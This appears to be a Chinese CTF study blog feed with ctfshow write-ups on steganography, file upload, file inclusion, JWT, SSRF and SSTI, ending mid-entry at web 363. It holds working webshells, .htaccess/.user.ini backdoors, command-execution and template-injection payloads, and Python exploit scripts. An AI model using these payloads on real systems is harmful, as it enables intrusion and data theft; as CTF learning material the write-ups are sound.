        <content type="html"><![CDATA[<h2 id="一-目前遇到的图片隐写术"><a href="#一-目前遇到的图片隐写术" class="headerlink" title="一.目前遇到的图片隐写术"></a>一.目前遇到的图片隐写术</h2><h2 id="1-附加式的图片隐写"><a href="#1-附加式的图片隐写" class="headerlink" title="1.附加式的图片隐写"></a>1.附加式的图片隐写</h2><p>直接附加字符串，由于计算机中图片处理程序识别到图片结束符就不再继续向下识别，因此后面的信息就被隐藏起来，这种方式可以直接notepad打开看到最后附加的字符。</p><p>图种是一种采用特殊方式将图片文件与rar文件结合起来的文件。该文件一般保存为jpg格式。可以用binwalk分析图片组成，也可以在010编辑器是否有zip或者rar等文件的文件头。</p><h2 id="2-基于文件结构的图片隐写（png）"><a href="#2-基于文件结构的图片隐写（png）" class="headerlink" title="2.基于文件结构的图片隐写（png）"></a>2.基于文件结构的图片隐写（png）</h2><p>1.文件头标志 89 50 4e 47 0d 0a 1a 0a 标志着png文件</p><p>接下来为IHDR数据块长度标志，后面跟着IHDR标识 49 48 44 52（ascii码为IHDR）再接下来就是IHDR块 先宽（4个字节）再高（4个字节）</p><p>如果图片原本是很高，但将图片高度变低，那么下面区域的信息就无法显示，可以用010编辑器修改高度复现。</p><p>2.IDAT 它存储实际的数据，在数据流中可包含多个连续顺序的图像数据块，如果能够了解IDAT的结构，我们就可以很方便的生成PNG图像。</p><p>​    这种类型还没刷到。</p><h2 id="3-基于LSB原理的图片隐写"><a href="#3-基于LSB原理的图片隐写" class="headerlink" title="3.基于LSB原理的图片隐写"></a>3.基于LSB原理的图片隐写</h2><p>LSB,最低有效位。图像像素一般是由RGB三原色组成，每一种颜色占8位，即一共有256种颜色，一共包含了256的3次方的颜色，颜色太多，而人的肉眼能区分的只有其中一小部分，这导致了当我们修改RGB颜色分量中最低的二进制位的时候，我们的肉眼是区分不出来的。</p><p>用Stegsolve进行各种尝试获得（还不太熟练使用）</p>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 图片隐写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传</title>
      <link href="/2022/01/22/ctfshow-wen-jian-shang-chuan/"/>
      <url>/2022/01/22/ctfshow-wen-jian-shang-chuan/</url>
      
        <content type="html"><![CDATA[<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>1.前端校验</p><p>上传图片马，然后在burpsuie里把后缀png更改为php，再去执行命令即可，制作图片马方法</p><h2 id="2-htaccess-和-user-ini-配置文件妙用"><a href="#2-htaccess-和-user-ini-配置文件妙用" class="headerlink" title="2.htaccess 和.user.ini 配置文件妙用"></a>2.htaccess 和.user.ini 配置文件妙用</h2><h3 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h3><p>在绕过文件上传的限制中，通常在 Apache 全局配置文件 httpd.conf 中有这样一条配置：</p><pre class="line-numbers language-none"><code class="language-none">AddType application/x-httpd-php .php .phtml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这条配置的意思就是将.php、.phtml 文件后缀的文件当做 php 文件执行，如果开启了这条配置，就可以上传.phtml 文件在执行 php 代码，这也就是为什么在文件上传时可以尝试上传.phtml，不过在高版本中这条配置默认是关闭的，也就是只能解析.php 文件后缀。</p><p>或者这条配置：</p><pre class="line-numbers language-none"><code class="language-none">SetHandler application/x-httpd-php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将所有文件都解析为 php 文件。</p><p>通常全局文件我们都是不可更改的，而 Apache 还有一个局部配置文件.htaccess，这个配置文件只对该目录所在的 web 目录起作用，例如：我们在 www 目录下有一个.htaccess 配置文件，配置内容为 <code>AddType application/x-httpd-php .jpg</code> ，将 jpg 文件当做 PHP 文件解析。这样就可以直接解析 jpg 后缀的 webshell。</p><pre class="line-numbers language-none"><code class="language-none">// .htaccessAddType application/x-httpd-php.jpg// 1.jpg&lt;?php phpinfo();?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>访问 1.jpg，当做 PHP 解析。</p><p>局限：.htaccess 配置文件只在 Apache 服务器中起作用。</p><h3 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h3><pre class="line-numbers language-none"><code class="language-none">// .user.iniauto_prepend_file = 1.jpg// 1.jpg&lt;?php phpinfo();?&gt;// 1.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>也就是在一个目录下有.user.ini 这个配置文件，配置内容为上，有 1.jpg，同时该目录下还需要有.php 后缀的文件，<code>auto_prepend_file = 1.jpg</code> 这个配置的意思就是在当前目录下的.php 文件包含 1.jpg 这个图片，在此处相当于在 1.php 文件头插入了 <code>require('1.jpg')</code> 这条语句，也就是说相当于文件包含。<br>另一条配置包含在文件尾，如果遇到了 exit 语句的话就会失效。</p><p>.user.ini 使用范围很广，不仅限于 Apache 服务器，同样适用于 Nginx 服务器，只要服务器启用了 fastcgi 模式 (通常非线程安全模式使用的就是 fastcgi 模式)。</p><p>局限：在.user.ini 中使用这条配置需要该目录下存在.php 文件，通常在文件上传中，一般是专门有一个目录用来存在图片，可能小概率会存在.php 文件。</p><p>但是有时可以使用 <code>../</code> 来将文件上传到其他目录，达到一个利用的效果。</p><p>注意：传入的时候可能内容会被ban 需要各种过滤</p><pre class="line-numbers language-none"><code class="language-none">短标签形式：&lt;?=system("tac ../f*");?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">短标签形式：&lt;?=`tac ../f*`?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3.<strong>getimagesize():</strong> 会对目标文件的16进制去进行一个读取，去读取头几个字符串是不是符合图片的要求</p><p> 可以加GIF89a图片头进行欺骗</p><p>也可以  1.png /b +2.php 3.png</p><h2 id="web151"><a href="#web151" class="headerlink" title="web151"></a>web151</h2><p>上传图片马，然后在burpsuie里把后缀png更改为php，再去执行命令即可，制作图片马方法</p><pre class="line-numbers language-none"><code class="language-none">用一张小点的图片和一句话木马，利用copy命令生成图片马copy 1.png/b+2.php/a 3.png<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="web152"><a href="#web152" class="headerlink" title="web152"></a>web152</h2><p>同上</p><h2 id="web-153"><a href="#web-153" class="headerlink" title="web 153"></a>web 153</h2><p>开始对php后缀进行了限制，这里我们利用<code>.user.ini</code>来构造后门</p><blockquote><p>php.ini是php的一个全局配置文件，对整个web服务起作用；而.user.ini和.htaccess一样是目录的配置文件，.user.ini就是用户自定义的一个php.ini，我们可以利用这个文件来构造后门和隐藏后门。</p></blockquote><pre class="line-numbers language-none"><code class="language-none">//.user.iniauto_prepend_file=1.png//1.png&lt;?php phpinfo();?&gt;//1.php(任意php文件)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>满足这三个文件在同一目录下，则相当于在1.php文件里插入了包含语句<code>require('1.png')</code>，进行了文件包含，所以我们就依次上传即可</p><h2 id="web-154"><a href="#web-154" class="headerlink" title="web 154"></a>web 154</h2><p>继续按照上题步骤，传一个<code>.user.ini</code>文件，接着在上传图片马的时候报错了</p><p>解码后显示的文字是不支持格式，说明可能内容里的php被ban了，改成短标签的形式再上传，发现可以通过</p><pre class="line-numbers language-none"><code class="language-none">短标签形式：&lt;?=system("tac ../f*");?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="web-155"><a href="#web-155" class="headerlink" title="web 155"></a>web 155</h2><p>同上</p><h2 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h2><p>同上</p><h2 id="web-157"><a href="#web-157" class="headerlink" title="web 157"></a>web 157</h2><p>一样用上题(web154)的办法可以通过，但过滤了分号，把短标签后面的<code>;</code>去掉，即</p><pre class="line-numbers language-none"><code class="language-none">短标签形式：&lt;?=system("tac ../f*")?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="web158"><a href="#web158" class="headerlink" title="web158"></a>web158</h2><p>同上</p><h2 id="web159"><a href="#web159" class="headerlink" title="web159"></a>web159</h2><p>这里把()给ban了，我们采用反引号来执行命令，即</p><pre class="line-numbers language-none"><code class="language-none">短标签形式：&lt;?=`tac ../f*`?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="web-160"><a href="#web-160" class="headerlink" title="web 160"></a>web 160</h2><p>依旧上传个<code>.user.ini</code>文件，但在传图片马的时候把反引号给ban了，我们使用include命令去配合php伪协议进行读取，因为把php给ban了，所以我们需要拼接起来，即</p><pre class="line-numbers language-none"><code class="language-none">&lt;?=include"ph"."p://filter/convert.base64-encode/resource=../flag.p"."hp"?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="web161"><a href="#web161" class="headerlink" title="web161"></a>web161</h2><p>这次上传失败了，尝试在头部加了图片文件头，就过去了，所以这里应该是用了getimagesize()进行检测</p><blockquote><p><strong>getimagesize():</strong> 会对目标文件的16进制去进行一个读取，去读取头几个字符串是不是符合图片的要求</p></blockquote><p>所以在上题的基础上都加个GIF89a图片头就可以了</p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含</title>
      <link href="/2022/01/22/ctfshow-wen-jian-bao-han/"/>
      <url>/2022/01/22/ctfshow-wen-jian-bao-han/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="web-78-81"><a href="#web-78-81" class="headerlink" title="web 78-81"></a>web 78-81</h2><p>1.</p><pre class="line-numbers language-none"><code class="language-none">if(isset($_GET['file'])){    $file = $_GET['file'];    include($file);}else{    highlight_file(__FILE__);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>?file=php://filter/convert.base64-encode/resource=flag.php</p><p>通过传递这个参数可以得到index.php的源码，下面说说为什么，看到源码中的include函数，这个表示从外部引入php文件并执行，如果执行不成功，就返回文件的源码。而include的内容是由用户控制的，所以通过我们传递的file参数，是include（）函数引入了index.php的base64编码格式，因为是base64编码格式，所以执行不成功，返回源码，所以我们得到了源码的base64格式，解码即可。</p><p>2.代码中把php替换成了<code>???</code>，php伪协议大小写可以绕过，所以我们这里使用php://input伪协议，paylaod如下</p><pre class="line-numbers language-none"><code class="language-none">?file=Php://inputpost：&lt;?php system("tac flag.php");?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>代码中把php替换成了<code>???</code>，php伪协议大小写可以绕过，所以我们这里使用php://input伪协议，paylaod如下</p><pre class="line-numbers language-none"><code class="language-none">?file=Php://inputpost：&lt;?php system("tac flag.php");?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>3.日志包含</p><p>apache一般是/var/log/apache/access.log。：</p><p>nginx的log在/var/log/nginx/access.log和/var/log/nginx/error.log<br>当访问一个不存在的资源时，Apache日志同样会记录 例如访问<a href="http://127.0.0.1/">http://127.0.0.1/</a><!--?php phpinfo();?-->。Apache会记录请求“<!--?php phpinfo();?-->”，并写到access.log文件中，这时候去包含access.log就可以利用包含漏洞但并不能直接利用，原因是直接访问URL后，一句话木马在日志文件中被编码了 需要通过burpsuite拦截直接访问<a href="http://127.0.0.1/">http://127.0.0.1/</a><!--?php phpinfo();?--> 就能生成包含一句话木马的access.log文件</p><h2 id="web-82"><a href="#web-82" class="headerlink" title="web 82"></a>web 82</h2><p>这次把<code>.</code>给过滤了，日志包含使用不了，我们使用session文件包含，先了解一些知识点，在php5.4之后php.ini开始有几个默认选项</p><blockquote><p>1.session.upload_progress.enabled = on<br>2.session.upload_progress.cleanup = on<br>3.session.upload_progress.prefix = “upload_progress_”<br>4.session.upload_progress.name = “PHP_SESSION_UPLOAD_PROGRESS”<br>5.session.use_strict_mode=off</p><p>第一个表示当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中<br>第二个表示当文件上传结束后，php将会立即清空对应session文件中的内容<br>第三和第四个<code>prefix+name</code>将表示为session中的键名<br>第五个表示我们对Cookie中sessionID可控</p></blockquote><p>简而言之，我们可以利用<code>session.upload_progress</code>将木马写入session文件，然后包含这个session文件。不过前提是我们需要创建一个session文件，并且知道session文件的存放位置。因为<code>session.use_strict_mode=off</code>的关系，我们可以自定义sessionID<br>linux系统中session文件一般的默认存储位置为 /tmp 或 /var/lib/php/session</p><p>例如我们在Cookie中设置了PHPSESSID=flag，php会在服务器上创建文件：/tmp/sess_flag，即使此时用户没有初始化session，php也会自动初始化Session。 并产生一个键值，为<code>prefix+name</code>的值，最后被写入sess_文件里<br>还有一个关键点就是<code>session.upload_progress.cleanup</code>默认是开启的，只要读取了post数据，就会清除进度信息，所以我们需要利用条件竞争来pass，写一个脚本来完成</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> io<span class="token keyword">import</span> requests<span class="token keyword">import</span> threadingurl <span class="token operator">=</span> <span class="token string">'http://453228ae-28f2-4bb0-b401-83514feae8df.chall.ctf.show:8080/'</span><span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">'PHP_SESSION_UPLOAD_PROGRESS'</span><span class="token punctuation">:</span> <span class="token string">'&lt;?php system("tac f*");?&gt;dotast'</span>    <span class="token punctuation">}</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        f <span class="token operator">=</span> io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">10</span><span class="token punctuation">)</span>        response <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>cookies<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span> <span class="token string">'flag'</span><span class="token punctuation">}</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> files<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'file'</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token string">'dota.txt'</span><span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">read</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        response <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">'?file=/tmp/sess_flag'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'dotast'</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>            <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'retry'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>    write <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>write<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    write<span class="token punctuation">.</span>daemon <span class="token operator">=</span> <span class="token boolean">True</span>    write<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    read<span class="token punctuation">(</span>session<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web-83-86"><a href="#web-83-86" class="headerlink" title="web 83 -86"></a>web 83 -86</h2><p>同上</p><h2 id="web-87"><a href="#web-87" class="headerlink" title="web 87"></a>web 87</h2><p>分析一下源码，get传入file，post传入content，但<code>$content</code>在开头增加了die函数，即使我们写入一句话也会先die，导致无法执行；并且还对<code>file</code>进行了url解码<br>我们可以使用base64的方式写入文件再进行decode，base64编码只包含64个可打印字符，而php解码base64时遇到不在其中的字符，会忽略掉，将合法字符进行组合变成一个字符串进行解码，所以<code>&lt;?php die('大佬别秀了');?&gt;</code>对其解码后，只有<code>phpdie</code>六个字符组成字符串进行解码，思路已经很清晰了，下面讲讲怎么做</p><p>第一，get传参file写入文件并且进行base64解码，即<br>?file=php://filter/write=convert.base64-decode/resource=datast.php<br>因为源码中有一次urldecode，所以我们需要对其进行两次url编码<br>%2570%2568%2570%253A%252F%252F%2566%2569%256C%2574%2565%2572%252F%2577%2572%2569%2574%2565%253D%2563%256F%256E%2576%2565%2572%2574%252E%2562%2561%2573%2565%2536%2534%252D%2564%2565%2563%256F%2564%2565%252F%2572%2565%2573%256F%2575%2572%2563%2565%253D%2564%2561%2574%2561%2573%2574%252E%2570%2568%2570</p><p>第二，post传参content为base64编码后的一句话木马，但注意的是前面剩下phpdie，一共6个字符，所以需要再加2个字符变8个<br>因为base64算法解码时是4个byte一组<br>content=nbPD9waHAgQGV2YWwoJF9QT1NUW3Bhc3NdKTs/Pg==</p><h2 id="web-88"><a href="#web-88" class="headerlink" title="web 88"></a>web 88</h2><pre class="line-numbers language-none"><code class="language-none">?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmwwZy5waHAnKTsgPz4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="web-116"><a href="#web-116" class="headerlink" title="web 116"></a>web 116</h2><p><img src="/2022/01/22/ctfshow-wen-jian-bao-han/image-20220125203226360.png" alt="image-20220125203226360"></p><p><img src="/2022/01/22/ctfshow-wen-jian-bao-han/image-20220125203246445.png" alt="image-20220125203246445"></p><h2 id="web-117"><a href="#web-117" class="headerlink" title="web 117"></a>web 117</h2><p>这题和前面的有点类似，也是绕过contents前面的死亡代码，只是把一些可利用的协议和编码给ban了，但还可以利用其它编码器进行绕过</p><blockquote><p>convert.iconv.：一种过滤器，和使用iconv()函数处理流数据有等同作用<br><code>iconv ( string $in_charset , string $out_charset , string $str )</code>：将字符串<code>$str</code>从<code>in_charset</code>编码转换到<code>$out_charset</code><br>这里引入usc-2的概念，作用是对目标字符串每两位进行一反转，值得注意的是，因为是两位所以字符串需要保持在偶数位上</p></blockquote><pre class="line-numbers language-none"><code class="language-none">PHP$result = iconv("UCS-2LE","UCS-2BE", '&lt;?php @eval($_POST[dotast]);?&gt;');echo "经过一次反转:".$result."\n";echo "经过第二次反转:".iconv("UCS-2LE","UCS-2BE", $result);//输出结果如下：//经过一次反转:?&lt;hp pe@av(l_$OPTSd[tosa]t;)&gt;?//经过第二次反转:&lt;?php @eval($_POST[dotast]);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到，经过两次反转之后代码又组装回来，思路就是用经过一次反转后的webshell和死亡代码<code>&lt;?php die();?&gt;</code>一起组合之后，经过第二次反转我们的webshell就恢复正常了，而死亡代码会被反转打乱不能执行<br>所以payload也就出来了，把前面的脚本改一下即可</p><pre class="line-numbers language-none"><code class="language-none">import requestsurl = "http://8a412388-9727-4ea0-8b0d-1f144f2d1a87.chall.ctf.show:8080/"get_data = "php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=dotast.php"get_url = url + "?file=" + get_datadata = {    'contents': '?&lt;hp pe@av(l_$OPTSd[tosa]t;)&gt;?'}res = requests.post(url=get_url, data=data)shell_url = url + "dotast.php"test = requests.get(shell_url)if(test.status_code == 200):    print("[*]getshell成功")    shell_data = {        'dotast': 'system("cat flag.php");'    }    result = requests.post(url=shell_url, data=shell_data)    print(result.text)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jwt</title>
      <link href="/2022/01/22/ctfshow-jwt/"/>
      <url>/2022/01/22/ctfshow-jwt/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="jwt"><a href="#jwt" class="headerlink" title="jwt"></a>jwt</h2><p>jwt(JSON Web Token)是一串json格式的字符串,由服务端用加密算法对信息签名来保证其完整性和不可伪造.Token里可以包含所有必要信息,这样服务端就无需保存任何关于用户和会话的信息,可以用于身份认证、会话状态维持,信息交换。</p><p>jwt由三部分组成，header，payload与signature以点隔开，形如 aaa.bbb.ccc;</p><p>header用来声明token的类型和签名用的算法等，需要经过Base64Url编码。</p><p>payload用来表示真正的token信息，也需要经过Base64Url编码。JWT规定了7个官方字段</p><pre class="line-numbers language-none"><code class="language-none">，供选用iss (issuer)：签发人exp (expiration time)：过期时间sub (subject)：主题aud (audience)：受众nbf (Not Before)：生效时间iat (Issued At)：签发时间jti (JWT ID)：编号<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>还可以自定义一些需要的信息。</p><p>signature,将前俩部分用alg指定的算法加密，再经过base64url编码。</p><p>BASE64URL编码的流程：</p><pre><code>  1、明文使用BASE64进行加密 2、在BASE64的基础上进行一下的编码：          1)去除尾部的"="          2)把"+"替换成"-"          3)把"/"替换成"_"</code></pre><p>JWT的安全问题</p><p>1.允许修改算法为none。注意：<a href="http://jwt.io/%E4%B8%8D%E8%83%BD%E7%BC%96%E7%A0%81none%E7%9A%84">http://jwt.io/不能编码none的</a></p><p>2.信息泄露 密钥泄露。</p><p>3.爆破密钥。</p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> jwt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssrf</title>
      <link href="/2022/01/22/ctfshow-ssrf/"/>
      <url>/2022/01/22/ctfshow-ssrf/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。</p><h2 id="351"><a href="#351" class="headerlink" title="351"></a>351</h2><!--?phperror_reporting(0);      highlight_file(__FILE__);$url=$_POST['url']; $ch=curl_init($url);                  //初始化cURL会话curl_setopt($ch, CURLOPT_HEADER, 0);   //启用时会将头文件的信息作为数据流输出curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); //获取的信息以文件流的形式返回，而不是直接输出$result=curl_exec($ch);   //执行cURL会话curl_close($ch);echo ($result);?--><p>payload :   url=127.0.0.1/flag.php</p><h2 id="352"><a href="#352" class="headerlink" title="352"></a>352</h2><p><img src="/2022/01/22/ctfshow-ssrf/image-20211121155746538.png" alt="image-20211121155746538"></p><p><img src="/2022/01/22/ctfshow-ssrf/5c75aa001957305ace15d4aaa22a482f.png" alt="image-20210908085752772"></p><p>payload:   url=<a href="http://127.0.0.1/flag.php">http://127.0.0.1/flag.php</a></p><p>总结： 127.0.0.1的各种写法 </p><p><a href="http://0.0.0.0/flag.php">http://0.0.0.0/flag.php</a></p><p><a href="http://0.0.0.0/flag.php">http://0/flag.php</a></p><p><a href="http://127.0.0.1/flag.php">http://127.1/flag.php</a></p><h2 id="352-353"><a href="#352-353" class="headerlink" title="352-353"></a>352-353</h2><p>同上通杀 127还可以用各种进制转化。</p><h2 id="354"><a href="#354" class="headerlink" title="354"></a>354</h2><p>方法一:DNS-Rebinding攻击绕过</p><pre class="line-numbers language-none"><code class="language-none">url=http://r.kshbss.ceye.io.ceye.io/flag.php 自己去ceye.io注册绑定127.0.0.1然后记得前面加r<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>方法二：访问vps搭建的 然后进行重定向到127.0.0.1</p><p><img src="/2022/01/22/ctfshow-ssrf/image-20211121160352633.png" alt="image-20211121160352633"></p><h2 id="355-356"><a href="#355-356" class="headerlink" title="355-356"></a>355-356</h2><p>前面的127.0.0.1各种写法 通杀</p><h2 id="357"><a href="#357" class="headerlink" title="357"></a>357</h2><p><img src="/2022/01/22/ctfshow-ssrf/image-20211121160755930.png" alt="image-20211121160755930"></p><p>FILTER_FLAG_IPV4 - 要求值是合法的 IPv4 IP（比如 255.255.255.255）<br>FILTER_FLAG_IPV6 - 要求值是合法的 IPv6 IP（比如 2001:0db8:85a3:08d3:1319:8a2e:0370:7334）<br>FILTER_FLAG_NO_PRIV_RANGE - 要求值是 RFC 指定的私域 IP （比如 192.168.0.1）<br>FILTER_FLAG_NO_RES_RANGE - 要求值不在保留的 IP 范围内。该标志接受 IPV4 和 IPV6 值。</p><p>我的vps不在保留ip和私有ip范围内，所以可以重定向绕过。</p><h2 id="358"><a href="#358" class="headerlink" title="358"></a>358</h2><p>要求以<a href="http://ctf.开头，以show结尾：`url=http://ctf.@127.0.0.1/flag.php?show`">http://ctf.开头，以show结尾：`url=http://ctf.@127.0.0.1/flag.php?show`</a></p><h2 id="359"><a href="#359" class="headerlink" title="359"></a>359</h2><p>打开是登录框，先随便输点什么，然后抓包<br>发现有个returl参数，并且可以随意更改url，这应该就是我们的利用点了</p><p>然后就是gopher协议打mysql,这里用到这个工具<a href="https://github.com/tarunkant/Gopherus">gopherus</a></p><p>python gopherus.py –exploit mysql</p><p>select “<!--?php @eval($_POST['cmd']);?-->“ into outfile ‘/var/www/html/2.php’;</p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssti</title>
      <link href="/2022/01/22/ctfshow-ssti/"/>
      <url>/2022/01/22/ctfshow-ssti/</url>
      
        <content type="html"><![CDATA[<h2 id="ssti浅叙"><a href="#ssti浅叙" class="headerlink" title="ssti浅叙"></a>ssti浅叙</h2><p>  <a href="https://www.anquanke.com/post/id/188172#h2-11">https://www.anquanke.com/post/id/188172#h2-11</a> SSTI/沙盒逃逸详细总结</p><p><a href="https://blog.csdn.net/weixin_45669205/article/details/114373785?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163757565916780271539127%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=163757565916780271539127&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-3-114373785.pc_search_result_cache&amp;utm_term=ctfshow+ssti&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/weixin_45669205/article/details/114373785?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163757565916780271539127%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=163757565916780271539127&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-3-114373785.pc_search_result_cache&amp;utm_term=ctfshow+ssti&amp;spm=1018.2226.3001.4187</a> ctfshow –ssti wp</p><p><a href="https://www.cnblogs.com/hetianlab/p/14154635.html">细说Jinja2之SSTI&amp;bypass </a></p><h2 id="web-361"><a href="#web-361" class="headerlink" title="web 361"></a>web 361</h2><p>尝试一下：<code>{{7*'7'}}</code>回显是<code>7777777</code>，判断是<code>Jinja2</code>模板（如果回显是49则为<code>Twig</code>模板）</p><pre class="line-numbers language-none"><code class="language-none">?name={{''.__class__.__mro__[-1].__subclasses__()[132].__init__.__globals__["popen"]("cat /f*").read()}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="web-362"><a href="#web-362" class="headerlink" title="web 362"></a>web 362</h2><p>在<code>__builtin__</code>中有众多的可用函数，包括了<code>eval</code></p><p>1:</p><pre class="line-numbers language-none"><code class="language-none">?name={{url_for.__globals__['__builtins__']['eval']("__import__('os').popen('cat /f*').read()")}}http://c25a456d-63f7-497e-9170-0365a9cdce53.chall.ctf.show/admin/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2:</p><pre class="line-numbers language-none"><code class="language-none">?name={{x.__init__.__globals__['__builtins__']['eval']("__import__('os').popen('cat /f*').read()")}} <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>x.<strong>init</strong>.<strong>globals__也可找到__builtin</strong>   x是任意英文字母组合</p><p>3:</p><pre class="line-numbers language-none"><code class="language-none">{% for i in ''.__class__.__mro__[1].__subclasses__() %}{% if i.__name__=='_wrap_close' %}{% print i.__init__.__globals__['popen']('ls').read() %}{% endif %}{% endfor %}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>wrap_close的这个类,此类中有popen函数</p><h2 id="web-363"><a href="#web-363" class="headerlink" title="web 363"></a>web 